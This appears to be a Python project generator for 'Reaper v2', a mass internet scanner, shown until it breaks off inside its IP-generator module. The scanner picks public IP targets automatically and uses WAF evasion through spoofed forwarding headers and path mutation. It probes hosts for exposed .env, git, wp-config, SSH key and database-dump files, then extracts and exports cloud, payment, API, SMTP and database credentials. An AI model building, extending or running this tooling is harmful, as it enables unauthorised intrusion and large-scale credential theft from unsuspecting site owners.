#!/usr/bin/env python3
"""
Reaper v2 — Project Builder
Run this script to generate the full project structure.
"""

import os

STRUCTURE = {}

# ============================================================
# config.py
# ============================================================
STRUCTURE["reaper/config.py"] = r'''"""
Reaper v2 — Configuration
Zero-target mode: only paths required. Targets auto-generated.
"""

import os
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class ScanConfig:
    max_targets: int = 50000
    target_mode: str = "all"
    ports: list = field(default_factory=lambda: [80, 443, 8080, 8443])
    precheck_ports: bool = True
    precheck_timeout: float = 2.0
    precheck_concurrency: int = 5000
    shodan_api_key: str = field(
        default_factory=lambda: os.environ.get("SHODAN_API_KEY", "")
    )
    censys_api_id: str = field(
        default_factory=lambda: os.environ.get("CENSYS_API_ID", "")
    )
    censys_api_secret: str = field(
        default_factory=lambda: os.environ.get("CENSYS_API_SECRET", "")
    )
    fofa_email: str = field(
        default_factory=lambda: os.environ.get("FOFA_EMAIL", "")
    )
    fofa_api_key: str = field(
        default_factory=lambda: os.environ.get("FOFA_API_KEY", "")
    )
    max_concurrent_requests: int = 800
    max_connections_per_host: int = 15
    total_connector_limit: int = 2000
    target_rps: int = 4000
    burst_size: int = 500
    connect_timeout: float = 5.0
    read_timeout: float = 8.0
    total_timeout: float = 12.0
    scan_mode: str = "L4+L7"
    waf_evasion: bool = True
    delay_jitter_ms: tuple = (0, 30)
    enabled_scanners: list = field(default_factory=lambda: [
        "path", "js", "r2s", "nvca", "ajs", "uafr", "git"
    ])
    output_dir: str = "results"
    verbose: bool = True
    log_file: str = "reaper.log"
    exclude_private: bool = True
    blacklist_file: Optional[str] = None
'''

# ============================================================
# utils/__init__.py
# ============================================================
STRUCTURE["reaper/utils/__init__.py"] = ""

# ============================================================
# utils/ip_utils.py
# ============================================================
STRUCTURE["reaper/utils/ip_utils.py"] = r'''"""
Reaper — IP Utilities
"""

import ipaddress
import re
from typing import Generator, Optional

PRIVATE_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),
    ipaddress.ip_network("fe80::/10"),
]

IP_V4_PATTERN = re.compile(
    r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b"
)
IP_V6_PATTERN = re.compile(r"\[?([0-9a-fA-F:]{2,39})\]?")


def is_valid_ip(addr: str) -> bool:
    try:
        ipaddress.ip_address(addr.strip("[]"))
        return True
    except ValueError:
        return False


def is_private_ip(addr: str) -> bool:
    try:
        ip_obj = ipaddress.ip_address(addr.strip("[]"))
        return any(ip_obj in net for net in PRIVATE_NETWORKS)
    except ValueError:
        return False


def expand_cidr(ip_str: str, mask: int = 28) -> Generator[str, None, None]:
    try:
        ip_obj = ipaddress.ip_address(ip_str.strip("[]"))
        network = ipaddress.ip_network(f"{ip_obj}/{mask}", strict=False)
        for host in network.hosts():
            yield str(host)
    except ValueError:
        return


def extract_ips_from_text(text: str) -> list[str]:
    found = set()
    for match in IP_V4_PATTERN.finditer(text):
        ip = match.group(0)
        if is_valid_ip(ip):
            found.add(ip)
    for match in IP_V6_PATTERN.finditer(text):
        ip = match.group(1)
        if is_valid_ip(ip) and len(ip) > 4:
            found.add(ip)
    return list(found)


def filter_ips(ips: list[str], exclude_private: bool = True,
               blacklist: Optional[set[str]] = None) -> list[str]:
    result = []
    bl = blacklist or set()
    for ip in ips:
        if ip in bl:
            continue
        if exclude_private and is_private_ip(ip):
            continue
        if is_valid_ip(ip):
            result.append(ip)
    return result
'''

# ============================================================
# utils/dns_utils.py
# ============================================================
STRUCTURE["reaper/utils/dns_utils.py"] = r'''"""
Reaper — DNS Utilities
"""

import asyncio
import socket


async def resolve_domain(domain: str) -> list[str]:
    loop = asyncio.get_event_loop()
    ips = []
    try:
        results = await loop.getaddrinfo(
            domain, None, family=socket.AF_UNSPEC, type=socket.SOCK_STREAM
        )
        for family, stype, proto, canonname, sockaddr in results:
            ip = sockaddr[0]
            if ip not in ips:
                ips.append(ip)
    except (socket.gaierror, OSError):
        pass
    return ips


async def reverse_lookup(ip: str) -> list[str]:
    loop = asyncio.get_event_loop()
    domains = []
    try:
        hostinfo = await loop.getnameinfo((ip, 0), socket.NI_NAMEREQD)
        if hostinfo and hostinfo[0]:
            domains.append(hostinfo[0])
    except (socket.gaierror, OSError):
        pass
    return domains


async def enumerate_subdomains(domain: str,
                               prefixes: list[str] | None = None) -> list:
    if prefixes is None:
        prefixes = [
            "www", "mail", "ftp", "admin", "dev", "staging", "api", "app",
            "test", "beta", "portal", "vpn", "cdn", "static", "assets",
            "ns1", "ns2", "mx", "smtp", "pop", "imap", "webmail",
            "git", "gitlab", "jenkins", "ci", "cd", "docker", "k8s",
            "monitor", "grafana", "kibana", "elastic", "db", "mysql",
            "postgres", "redis", "mongo", "minio", "s3", "backup",
            "internal", "intranet", "uat", "qa", "sandbox", "demo",
            "old", "new", "v2", "v3", "legacy", "shop", "store",
            "pay", "billing", "auth", "sso", "login", "oauth",
            "webhook", "callback", "ws", "socket", "graphql",
        ]
    found = []
    sem = asyncio.Semaphore(100)

    async def check(prefix: str):
        subdomain = f"{prefix}.{domain}"
        async with sem:
            ips = await resolve_domain(subdomain)
            if ips:
                found.append((subdomain, ips))

    tasks = [check(p) for p in prefixes]
    await asyncio.gather(*tasks, return_exceptions=True)
    return found
'''

# ============================================================
# utils/http_utils.py
# ============================================================
STRUCTURE["reaper/utils/http_utils.py"] = r'''"""
Reaper — HTTP Utilities
"""

import ssl
import asyncio
from typing import Optional
import aiohttp


def create_ssl_context() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def create_connector(total_limit: int = 2000,
                     per_host_limit: int = 20) -> aiohttp.TCPConnector:
    return aiohttp.TCPConnector(
        limit=total_limit,
        limit_per_host=per_host_limit,
        ssl=create_ssl_context(),
        enable_cleanup_closed=True,
        ttl_dns_cache=300,
        force_close=False,
    )


def create_timeout(connect: float = 5.0, read: float = 10.0,
                   total: float = 15.0) -> aiohttp.ClientTimeout:
    return aiohttp.ClientTimeout(connect=connect, sock_read=read, total=total)


async def fetch(session: aiohttp.ClientSession, url: str,
                method: str = "GET", headers: Optional[dict] = None,
                max_retries: int = 2,
                retry_delay: float = 0.5) -> Optional[dict]:
    for attempt in range(max_retries + 1):
        try:
            async with session.request(
                method, url, headers=headers,
                allow_redirects=True, max_redirects=3
            ) as resp:
                body = await resp.text(errors="replace")
                return {
                    "url": str(resp.url),
                    "status": resp.status,
                    "headers": dict(resp.headers),
                    "body": body,
                    "size": len(body),
                }
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
            if attempt < max_retries:
                await asyncio.sleep(retry_delay * (attempt + 1))
    return None
'''

# ============================================================
# core/__init__.py
# ============================================================
STRUCTURE["reaper/core/__init__.py"] = ""

# ============================================================
# core/waf_bypass.py
# ============================================================
STRUCTURE["reaper/core/waf_bypass.py"] = r'''"""
Reaper — WAF Evasion Engine
"""

import random
import string
import urllib.parse
from typing import Optional

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Dalvik/2.1.0 (Linux; U; Android 14; Build/UP1A.231005.007)",
    "curl/8.7.1",
    "python-requests/2.32.3",
    "Go-http-client/2.0",
    "okhttp/4.12.0",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "*/*",
    "application/json, text/plain, */*",
    "text/html, application/xhtml+xml",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9", "en-GB,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.7", "ja-JP,ja;q=0.9",
    "ru-RU,ru;q=0.9,en;q=0.5", "zh-CN,zh;q=0.9", "es-ES,es;q=0.9,en;q=0.8",
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/",
    "https://duckduckgo.com/", "https://yandex.ru/", "",
]


def _rand_str(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def generate_headers(custom_host: Optional[str] = None) -> dict:
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(ACCEPT_HEADERS),
        "Accept-Language": random.choice(ACCEPT_LANGUAGES),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": random.choice(["no-cache", "max-age=0", ""]),
    }
    ref = random.choice(REFERERS)
    if ref:
        headers["Referer"] = ref
    if custom_host:
        headers["Host"] = custom_host
    tricks = random.sample([
        ("X-Forwarded-For", f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"),
        ("X-Real-IP", f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"),
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Forwarded-Host", custom_host or "localhost"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Original-URL", f"/{_rand_str(4)}"),
        ("X-Rewrite-URL", f"/{_rand_str(4)}"),
    ], k=random.randint(1, 3))
    for k, v in tricks:
        headers[k] = v
    return headers


def mutate_path(path: str, randomize_case: bool = True,
                add_junk: bool = True, use_encoding: bool = True) -> str:
    mutated = path
    technique = random.randint(0, 5)
    if technique == 0 and use_encoding:
        chars = list(mutated)
        for i in range(len(chars)):
            if chars[i].isalpha() and random.random() < 0.15:
                encoded = urllib.parse.quote(chars[i])
                chars[i] = urllib.parse.quote(encoded)
        mutated = "".join(chars)
    elif technique == 1 and randomize_case:
        chars = list(mutated)
        for i in range(len(chars)):
            if chars[i].isalpha() and random.random() < 0.3:
                chars[i] = chars[i].swapcase()
        mutated = "".join(chars)
    elif technique == 2:
        parts = mutated.split("/")
        new_parts = []
        for p in parts:
            new_parts.append(p)
            if random.random() < 0.2 and p:
                new_parts.append(".")
        mutated = "/".join(new_parts)
    elif technique == 3 and add_junk:
        sep = "&" if "?" in mutated else "?"
        mutated = f"{mutated}{sep}{_rand_str(3)}={_rand_str(5)}"
    elif technique == 4:
        suffixes = ["/", "//", "/.", "/..", ";.css", ";.js", "%23", "%00"]
        mutated = mutated + random.choice(suffixes)
    elif technique == 5:
        if "/" in mutated[1:]:
            idx = mutated.index("/", 1)
            junk = f"/{_rand_str(4)}/.."
            mutated = mutated[:idx] + junk + mutated[idx:]
    return mutated
'''

# ============================================================
# extractors/__init__.py
# ============================================================
STRUCTURE["reaper/extractors/__init__.py"] = ""

# ============================================================
# extractors/secrets.py
# ============================================================
STRUCTURE["reaper/extractors/secrets.py"] = r'''"""
Reaper — Secrets Extractor
"""

import re
from dataclasses import dataclass
from typing import Optional


@dataclass
class Secret:
    type: str
    value: str
    key_name: Optional[str] = None
    context: Optional[str] = None
    source_url: Optional[str] = None
    line: Optional[int] = None


SECRET_PATTERNS: list[tuple[str, re.Pattern, Optional[int]]] = [
    ("AWS_ACCESS_KEY", re.compile(r"(?:AKIA[0-9A-Z]{16})"), None),
    ("AWS_SECRET_KEY", re.compile(r"""(?:aws_secret_access_key|AWS_SECRET_ACCESS_KEY|aws_secret)\s*[=:]\s*['"]?([A-Za-z0-9/+=]{40})['"]?"""), 1),
    ("GOOGLE_API_KEY", re.compile(r"AIza[0-9A-Za-z_-]{35}"), None),
    ("GOOGLE_OAUTH", re.compile(r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com"), None),
    ("GCP_SERVICE_ACCOUNT", re.compile(r'"type"\s*:\s*"service_account"'), None),
    ("GITHUB_TOKEN", re.compile(r"gh[pousr]_[A-Za-z0-9_]{36,255}"), None),
    ("GITHUB_PAT_FINE", re.compile(r"github_pat_[A-Za-z0-9_]{22,}"), None),
    ("GITLAB_TOKEN", re.compile(r"glpat-[A-Za-z0-9\-_]{20,}"), None),
    ("SLACK_TOKEN", re.compile(r"xox[boaprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*"), None),
    ("SLACK_WEBHOOK", re.compile(r"https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{24,}"), None),
    ("STRIPE_SECRET", re.compile(r"sk_live_[0-9a-zA-Z]{24,}"), None),
    ("STRIPE_PUBLISHABLE", re.compile(r"pk_live_[0-9a-zA-Z]{24,}"), None),
    ("TWILIO_SID", re.compile(r"AC[a-f0-9]{32}"), None),
    ("SENDGRID_KEY", re.compile(r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}"), None),
    ("MAILGUN_KEY", re.compile(r"key-[0-9a-zA-Z]{32}"), None),
    ("FIREBASE_URL", re.compile(r"https://[a-z0-9-]+\.firebaseio\.com"), None),
    ("TELEGRAM_BOT_TOKEN", re.compile(r"[0-9]{8,10}:[A-Za-z0-9_-]{35}"), None),
    ("DISCORD_TOKEN", re.compile(r"[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27,}"), None),
    ("DISCORD_WEBHOOK", re.compile(r"https://discord(?:app)?\.com/api/webhooks/\d+/[\w-]+"), None),
    ("OPENAI_KEY", re.compile(r"sk-[A-Za-z0-9]{20,}T3BlbkFJ[A-Za-z0-9]{20,}"), None),
    ("OPENAI_KEY_V2", re.compile(r"sk-proj-[A-Za-z0-9_-]{40,}"), None),
    ("ANTHROPIC_KEY", re.compile(r"sk-ant-[A-Za-z0-9_-]{40,}"), None),
    ("SHOPIFY_TOKEN", re.compile(r"shpat_[a-fA-F0-9]{32}"), None),
    ("DIGITALOCEAN_TOKEN", re.compile(r"dop_v1_[a-f0-9]{64}"), None),
    ("NPM_TOKEN", re.compile(r"npm_[A-Za-z0-9]{36}"), None),
    ("PYPI_TOKEN", re.compile(r"pypi-[A-Za-z0-9_-]{50,}"), None),
    ("SMTP_HOST", re.compile(r"""(?:SMTP|MAIL)[_\s]*(?:HOST|SERVER)\s*[=:]\s*['"]?([^\s'"]+)['"]?""", re.I), 1),
    ("SMTP_USER", re.compile(r"""(?:SMTP|MAIL)[_\s]*(?:USER(?:NAME)?)\s*[=:]\s*['"]?([^\s'"]+)['"]?""", re.I), 1),
    ("SMTP_PASS", re.compile(r"""(?:SMTP|MAIL)[_\s]*(?:PASS(?:WORD)?)\s*[=:]\s*['"]?([^\s'"]+)['"]?""", re.I), 1),
    ("SMTP_PORT", re.compile(r"""(?:SMTP|MAIL)[_\s]*PORT\s*[=:]\s*['"]?(\d{2,5})['"]?""", re.I), 1),
    ("SMTP_URL", re.compile(r"smtp://[^\s<>\"']+"), None),
    ("SMTP_FULL", re.compile(r"smtps?://([^:]+):([^@]+)@([^:/]+)(?::(\d+))?"), None),
    ("DATABASE_URL", re.compile(r"(?:mysql|postgres(?:ql)?|mongodb(?:\+srv)?|redis|amqp|mssql)://[^\s<>\"']+"), None),
    ("DB_PASSWORD", re.compile(r"""(?:DB|DATABASE|MYSQL|POSTGRES|MONGO|REDIS)[_\s]*(?:PASS(?:WORD)?)\s*[=:]\s*['"]?([^\s'"]{4,})['"]?""", re.I), 1),
    ("PRIVATE_KEY", re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----"), None),
    ("JWT_SECRET", re.compile(r"""(?:JWT[_\s]*SECRET|SECRET[_\s]*KEY)\s*[=:]\s*['"]?([^\s'"]{8,})['"]?""", re.I), 1),
    ("JWT_TOKEN", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+"), None),
    ("GENERIC_SECRET", re.compile(r"""(?:SECRET|TOKEN|PASSWORD|PASSWD|API_KEY|APIKEY|ACCESS_KEY|AUTH_TOKEN|PRIVATE_KEY)\s*[=:]\s*['"]?([^\s'"]{8,})['"]?""", re.I), 1),
    ("BEARER_TOKEN", re.compile(r"""[Bb]earer\s+([A-Za-z0-9_\-\.]+={0,2})"""), 1),
    ("BASIC_AUTH", re.compile(r"""[Bb]asic\s+([A-Za-z0-9+/]+=*)"""), 1),
]

FALSE_POSITIVES = {
    "example", "test", "dummy", "placeholder", "changeme", "your_",
    "xxx", "yyy", "zzz", "TODO", "FIXME", "INSERT", "REPLACE",
    "0000000000", "1111111111", "abcdef", "123456",
}


def _is_false_positive(value: str) -> bool:
    lower = value.lower()
    if len(value) < 6:
        return True
    for fp in FALSE_POSITIVES:
        if fp in lower:
            return True
    if len(set(value)) < 3:
        return True
    return False


def extract_secrets(text: str, source_url: str = "") -> list[Secret]:
    results = []
    seen_values = set()
    lines = text.split("\n")
    for line_no, line in enumerate(lines, 1):
        for secret_type, pattern, group_idx in SECRET_PATTERNS:
            for match in pattern.finditer(line):
                if group_idx is not None:
                    try:
                        value = match.group(group_idx)
                    except IndexError:
                        value = match.group(0)
                else:
                    value = match.group(0)
                if not value or _is_false_positive(value):
                    continue
                dedup_key = f"{secret_type}:{value}"
                if dedup_key in seen_values:
                    continue
                seen_values.add(dedup_key)
                context_start = max(0, match.start() - 40)
                context_end = min(len(line), match.end() + 40)
                ctx = line[context_start:context_end].strip()
                results.append(Secret(
                    type=secret_type, value=value, context=ctx,
                    source_url=source_url, line=line_no,
                ))
    return results
'''

# ============================================================
# extractors/link_parser.py
# ============================================================
STRUCTURE["reaper/extractors/link_parser.py"] = r'''"""
Reaper — Link Parser
"""

import re
from urllib.parse import urljoin
from typing import Optional
from utils.ip_utils import extract_ips_from_text

URL_PATTERN = re.compile(r"""(?:https?://[^\s<>"'`\)}\]]+)""")
RELATIVE_PATH_PATTERN = re.compile(r"""(?:['"])((?:/[a-zA-Z0-9._~:/?#\[\]@!$&'()*+,;=%-]+){1,})(?:['"])""")
DOMAIN_PATTERN = re.compile(r"\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+(?:[a-zA-Z]{2,})\b")
ENDPOINT_PATTERN = re.compile(
    r"""(?:(?:fetch|axios|XMLHttpRequest|\.get|\.post|\.put|\.delete|\.patch|\.request|url|href|src|action|endpoint|api[_\-]?(?:url|endpoint|base))\s*[\(=:]\s*['"`])([^'"`\s]+)['"`]""",
    re.I,
)


def extract_urls(text: str, base_url: Optional[str] = None) -> list[str]:
    urls = set()
    for match in URL_PATTERN.finditer(text):
        url = match.group(0).rstrip(".,;:!?)}>]'\"")
        urls.add(url)
    if base_url:
        for match in RELATIVE_PATH_PATTERN.finditer(text):
            path = match.group(1)
            urls.add(urljoin(base_url, path))
        for match in ENDPOINT_PATTERN.finditer(text):
            endpoint = match.group(1)
            if endpoint.startswith(("http://", "https://")):
                urls.add(endpoint)
            elif endpoint.startswith("/"):
                urls.add(urljoin(base_url, endpoint))
    return list(urls)


def extract_domains(text: str) -> list[str]:
    domains = set()
    for match in DOMAIN_PATTERN.finditer(text):
        domain = match.group(0).lower()
        if "." in domain and not domain.endswith(
            (".css", ".js", ".png", ".jpg", ".gif", ".svg", ".woff", ".woff2", ".ttf")
        ):
            domains.add(domain)
    return list(domains)


def extract_all_targets(text: str, base_url: Optional[str] = None) -> dict:
    return {
        "urls": extract_urls(text, base_url),
        "ips": extract_ips_from_text(text),
        "domains": extract_domains(text),
    }
'''

# ============================================================
# core/path_loader.py
# ============================================================
STRUCTURE["reaper/core/path_loader.py"] = r'''"""
Reaper — Path Loader
"""

import json
import csv
import io
from pathlib import Path
from typing import Optional


class PathLoader:
    def __init__(self):
        self._wordlists: dict[str, list[str]] = {}

    def load_file(self, filepath: str, name: Optional[str] = None) -> int:
        p = Path(filepath)
        if not p.exists():
            raise FileNotFoundError(f"Wordlist not found: {filepath}")
        wl_name = name or p.stem
        content = p.read_text(encoding="utf-8", errors="replace")
        suffix = p.suffix.lower()
        raw_paths = []
        if suffix == ".json":
            data = json.loads(content)
            if isinstance(data, list):
                raw_paths = [str(x).strip() for x in data]
            elif isinstance(data, dict) and "paths" in data:
                raw_paths = [str(x).strip() for x in data["paths"]]
        elif suffix == ".csv":
            reader = csv.reader(io.StringIO(content))
            for row in reader:
                if row:
                    raw_paths.append(row[0].strip())
        else:
            raw_paths = [line.strip() for line in content.splitlines()]
        cleaned = self._clean_and_dedup(raw_paths)
        self._wordlists[wl_name] = cleaned
        return len(cleaned)

    def load_from_string(self, content: str, name: str = "inline") -> int:
        raw_paths = [line.strip() for line in content.splitlines()]
        cleaned = self._clean_and_dedup(raw_paths)
        self._wordlists[name] = cleaned
        return len(cleaned)

    def load_default(self) -> int:
        default_paths = [
            "/.env", "/.env.local", "/.env.production", "/.env.backup",
            "/.env.old", "/.env.save", "/.env.bak", "/.env.dev",
            "/.env.staging", "/.env.example",
            "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
            "/wp-config.php.save", "/wp-config.txt",
            "/config.php", "/config.php.bak", "/config.inc.php",
            "/configuration.php", "/settings.php",
            "/.git/config", "/.git/HEAD", "/.git/index",
            "/.git/logs/HEAD", "/.git/refs/heads/master", "/.git/refs/heads/main",
            "/.gitignore",
            "/.svn/entries", "/.svn/wc.db",
            "/phpinfo.php", "/info.php", "/test.php",
            "/debug", "/debug/vars", "/debug/pprof",
            "/server-status", "/server-info",
            "/actuator", "/actuator/env", "/actuator/health",
            "/actuator/configprops", "/actuator/mappings",
            "/api/.env", "/api/config", "/api/debug",
            "/swagger.json", "/swagger-ui.html", "/openapi.json", "/api-docs",
            "/graphql", "/graphiql",
            "/console", "/adminer.php",
            "/elmah.axd", "/trace.axd",
            "/web.config", "/web.config.bak",
            "/robots.txt", "/sitemap.xml", "/security.txt",
            "/.well-known/security.txt",
            "/backup.sql", "/dump.sql", "/db.sql", "/database.sql",
            "/backup.zip", "/backup.tar.gz",
            "/config.yml", "/config.yaml", "/config.json",
            "/docker-compose.yml", "/Dockerfile", "/.dockerenv",
            "/composer.json", "/package.json", "/yarn.lock", "/.npmrc",
            "/requirements.txt", "/Pipfile",
            "/go.mod", "/Cargo.toml",
            "/.DS_Store", "/.htaccess", "/.htpasswd",
            "/id_rsa", "/id_dsa", "/id_ed25519",
            "/proc/self/environ", "/proc/self/cmdline",
        ]
        cleaned = self._clean_and_dedup(default_paths)
        self._wordlists["default"] = cleaned
        return len(cleaned)

    def get_all_paths(self) -> list[str]:
        all_paths = []
        seen = set()
        for wl_paths in self._wordlists.values():
            for p in wl_paths:
                if p not in seen:
                    seen.add(p)
                    all_paths.append(p)
        return sorted(all_paths)

    def get_wordlist(self, name: str) -> list[str]:
        return self._wordlists.get(name, [])

    def list_wordlists(self) -> dict[str, int]:
        return {name: len(paths) for name, paths in self._wordlists.items()}

    @staticmethod
    def _clean_and_dedup(paths: list[str]) -> list[str]:
        cleaned = []
        seen = set()
        for p in paths:
            p = p.strip()
            if not p or p.startswith("#"):
                continue
            if not p.startswith("/"):
                p = "/" + p
            if p not in seen:
                seen.add(p)
                cleaned.append(p)
        return sorted(cleaned)
'''

# ============================================================
# core/target_gen.py
# ============================================================
STRUCTURE["reaper/core/target_gen.py"] = r'''"""
Reaper — Target Generator (chaining support)
"""

import asyncio
import logging
from dataclasses import dataclass
from typing import Optional

from utils.ip_utils import is_valid_ip, is_private_ip, filter_ips, extract_ips_from_text

logger = logging.getLogger("reaper.target_gen")


@dataclass
class Target:
    host: str
    port: int = 443
    is_ip: bool = False
    source: str = "seed"
    priority: int = 0


class TargetGenerator:
    def __init__(self, exclude_private: bool = True,
                 blacklist: Optional[set[str]] = None,
                 max_targets: int = 100000):
        self._targets: dict[str, Target] = {}
        self._exclude_private = exclude_private
        self._blacklist = blacklist or set()
        self._max_targets = max_targets
        self._stats = {"from_parse": 0, "filtered": 0}

    @property
    def stats(self) -> dict:
        return {**self._stats, "total": len(self._targets)}

    def add_from_parsed_content(self, text: str,
                                ports: Optional[list[int]] = None):
        if ports is None:
            ports = [80, 443]
        ips = extract_ips_from_text(text)
        filtered = filter_ips(ips, self._exclude_private, self._blacklist)
        for ip in filtered:
            for port in ports:
                key = f"{ip}:{port}"
                if key not in self._targets and len(self._targets) < self._max_targets:
                    self._targets[key] = Target(
                        host=ip, port=port, is_ip=True,
                        source="content_parse", priority=1,
                    )
                    self._stats["from_parse"] += 1

    def get_targets(self, sort_by_priority: bool = True) -> list[Target]:
        targets = list(self._targets.values())
        if sort_by_priority:
            targets.sort(key=lambda t: (-t.priority, t.host))
        return targets

    def get_target_count(self) -> int:
        return len(self._targets)
'''

# ============================================================
# core/result_store.py
# ============================================================
STRUCTURE["reaper/core/result_store.py"] = r'''"""
Reaper — Result Store
"""

import json
import csv
import asyncio
from datetime import datetime, timezone
from dataclasses import dataclass, field, asdict
from typing import Optional
from pathlib import Path
from extractors.secrets import Secret


@dataclass
class ScanResult:
    url: str
    status: int
    scanner: str
    secrets: list[Secret] = field(default_factory=list)
    new_targets: list[str] = field(default_factory=list)
    response_size: int = 0
    timestamp: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now(timezone.utc).isoformat()


class ResultStore:
    def __init__(self):
        self._results: list[ScanResult] = []
        self._seen_urls: set[str] = set()
        self._seen_secrets: set[str] = set()
        self._lock = asyncio.Lock()
        self._total_scanned = 0
        self._total_secrets = 0
        self._total_new_targets = 0

    @property
    def stats(self) -> dict:
        return {
            "total_scanned": self._total_scanned,
            "total_results": len(self._results),
            "total_secrets": self._total_secrets,
            "total_new_targets": self._total_new_targets,
        }

    async def add_result(self, result: ScanResult) -> bool:
        async with self._lock:
            self._total_scanned += 1
            if not result.secrets and not result.new_targets:
                return False
            if result.url in self._seen_urls:
                return False
            new_secrets = []
            for secret in result.secrets:
                key = f"{secret.type}:{secret.value}"
                if key not in self._seen_secrets:
                    self._seen_secrets.add(key)
                    new_secrets.append(secret)
            if not new_secrets and not result.new_targets:
                return False
            result.secrets = new_secrets
            self._results.append(result)
            self._seen_urls.add(result.url)
            self._total_secrets += len(new_secrets)
            self._total_new_targets += len(result.new_targets)
            return True

    def get_all_secrets(self) -> list[Secret]:
        secrets = []
        for r in self._results:
            secrets.extend(r.secrets)
        return secrets

    def export_json(self, filepath: str):
        data = {
            "scan_date": datetime.now(timezone.utc).isoformat(),
            "stats": self.stats,
            "results": [
                {
                    "url": r.url, "status": r.status, "scanner": r.scanner,
                    "timestamp": r.timestamp,
                    "secrets": [asdict(s) for s in r.secrets],
                    "new_targets": r.new_targets,
                }
                for r in self._results
            ],
        }
        Path(filepath).parent.mkdir(parents=True, exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

    def export_csv(self, filepath: str):
        Path(filepath).parent.mkdir(parents=True, exist_ok=True)
        with open(filepath, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["url", "status", "scanner", "secret_type",
                             "secret_value", "context", "timestamp"])
            for r in self._results:
                for s in r.secrets:
                    writer.writerow([r.url, r.status, r.scanner,
                                     s.type, s.value, s.context or "", r.timestamp])

    def summary(self) -> str:
        lines = [
            "=== Reaper Scan Summary ===",
            f"Total requests:    {self._total_scanned}",
            f"Hits with data:    {len(self._results)}",
            f"Unique secrets:    {self._total_secrets}",
            f"New targets found: {self._total_new_targets}",
            "", "Secrets by type:",
        ]
        type_count: dict[str, int] = {}
        for r in self._results:
            for s in r.secrets:
                type_count[s.type] = type_count.get(s.type, 0) + 1
        for t, c in sorted(type_count.items(), key=lambda x: -x[1]):
            lines.append(f"  {t}: {c}")
        return "\n".join(lines)
'''

# ============================================================
# core/ip_generator.py
# ============================================================
STRUCTURE["reaper/core/ip_generator.py"] = r'''"""
Reaper v2 — IP Generator
Auto-generates targets. No seed input required.
"""

import random
import asyncio
import ipaddress
import logging
from typing import Optional

logger = logging.getLogger("reaper.ipgen")

RESERVED_NETWORKS = [
    ipaddress.ip_network("0.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("100.64.0.0/10"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.0.0.0/24"),
    ipaddress.ip_network("192.0.2.0/24"),
    ipaddress.ip_network("192.88.99.0/24"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("198.18.0.0/15"),
    ipaddress.ip_network("198.51.100.0/24"),
    ipaddress.ip_network("203.0.113.0/24"),
    ipaddress.ip_network("224.0.0.0/4"),
